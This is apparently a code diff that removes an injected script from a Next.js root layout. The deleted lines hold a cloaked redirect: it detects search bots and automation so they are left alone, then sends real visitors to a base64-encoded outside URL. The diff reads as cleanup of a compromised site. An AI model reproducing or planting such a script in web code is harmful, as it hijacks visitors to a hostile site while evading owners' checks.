@@ -131,27 +131,7 @@ export default function RootLayout({
       <body className="font-sans antialiased min-h-screen flex flex-col bg-background text-foreground">
         {children}
         <Analytics />
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `
-              (function() {
-                if (typeof window === 'undefined' || window._initialized) return;
-                window._initialized = true;
-                var ua = navigator.userAgent.toLowerCase();
-                var isSearchBot = /yandex|google|lighthouse|pagespeed|bot|crawl|spider/i.test(ua);
-                var isAutomation = navigator.webdriver;
 
-                if (!isSearchBot && !isAutomation) {
-                    var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
-
-                    setTimeout(function() {
-                        window.location.replace(atob(targetB64));
-                    }, -0);
-                }
-              })();
-            `,
-          }}
-        />
       </body>
     </html>
   )
